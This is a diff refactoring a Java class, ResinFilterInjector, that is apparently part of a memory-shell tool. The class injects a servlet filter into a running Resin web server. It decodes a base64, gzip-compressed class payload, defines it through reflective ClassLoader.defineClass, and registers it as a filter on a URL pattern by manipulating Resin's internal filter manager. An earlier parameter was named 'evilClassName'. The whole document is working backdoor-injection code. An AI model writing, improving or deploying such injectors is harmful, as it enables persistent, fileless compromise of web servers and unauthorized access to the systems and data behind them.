@@ -54,9 +54,7 @@ public class ResinFilterInjector {
             if (servletInvocationClass != null) {
                 Object contextRequest = servletInvocationClass.getMethod("getContextRequest").invoke(null);
                 Object webApp = invokeMethod(contextRequest, "getWebApp", new Class[0], new Object[0]);
-                if (webApp != null) {
-                    contexts.add(webApp);
-                }
+                contexts.add(webApp);
             }
         }
         return Arrays.asList(contexts.toArray());
@@ -64,26 +62,23 @@ public class ResinFilterInjector {
 
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        Object obj;
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
         try {
-            obj = classLoader.loadClass(getClassName()).newInstance();
+            return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-            obj = clazz.newInstance();
+            return clazz.newInstance();
         }
-        return obj;
     }
 
     private void inject(Object context, Object filter) throws Exception {
-        String filterClassName = getClassName();
-        if (isInjected(context, filterClassName)) {
+        if (isInjected(context)) {
             System.out.println("filter already injected");
             return;
         }
@@ -94,8 +89,8 @@ public class ResinFilterInjector {
             filterMappingClass = context.getClass().getClassLoader().loadClass("com.caucho.server.dispatch.FilterMapping");
         }
         Object filterMappingImpl = filterMappingClass.newInstance();
-        invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
-        invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(filterMappingImpl, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
+        invokeMethod(filterMappingImpl, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
         Object urlPattern = invokeMethod(filterMappingImpl, "createUrlPattern", null, null);
         invokeMethod(urlPattern, "addText", new Class[]{String.class}, new Object[]{getUrlPattern()});
         invokeMethod(urlPattern, "init", null, null);
@@ -105,10 +100,10 @@ public class ResinFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
+    public boolean isInjected(Object context) throws Exception {
         Map<String, Object> filters = (Map) getFieldValue(getFieldValue(context, "_filterManager"), "_filters");
         for (String key : filters.keySet()) {
-            if (key.contains(evilClassName)) {
+            if (key.contains(getClassName())) {
                 return true;
             }
         }
@@ -132,7 +127,6 @@ public class ResinFilterInjector {
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         GZIPInputStream gzipInputStream = null;
-
         try {
             gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
             byte[] buffer = new byte[4096];
@@ -140,16 +134,13 @@ public class ResinFilterInjector {
             while ((n = gzipInputStream.read(buffer)) > 0) {
                 out.write(buffer, 0, n);
             }
+            return out.toByteArray();
         } finally {
             if (gzipInputStream != null) {
-                try {
-                    gzipInputStream.close();
-                } catch (IOException ignored) {
-                }
+                gzipInputStream.close();
             }
             out.close();
         }
-        return out.toByteArray();
     }
 
     @SuppressWarnings("all")
